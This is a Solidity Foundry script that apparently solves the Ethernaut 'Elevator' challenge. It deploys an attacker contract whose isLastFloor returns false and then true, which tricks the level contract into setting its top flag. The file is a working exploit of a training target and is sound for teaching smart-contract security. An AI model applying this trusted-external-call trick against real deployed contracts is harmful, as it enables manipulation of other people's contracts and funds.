// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Elevator } from "../src/11_Elevator.sol";

contract Attacker {

    Elevator challenge;
    bool public answer;
  constructor(address challengeInstanceAddress) {
    challenge = Elevator(challengeInstanceAddress);
  }

  function attack(uint256 _floor) public {
    challenge.goTo(_floor);
  }

  function isLastFloor(uint256 _floor) public returns(bool) {
    _floor;
    if(!answer){
      answer = true;
      return false;
    } else {
      answer = false;
      return true;
    }
  }

}

contract ElevatorAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("Elevator"));    

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.attack(1);

    console.log("Top Floor: %s", Elevator(challengeInstanceAddress).top());

    vm.stopBroadcast();
  }

}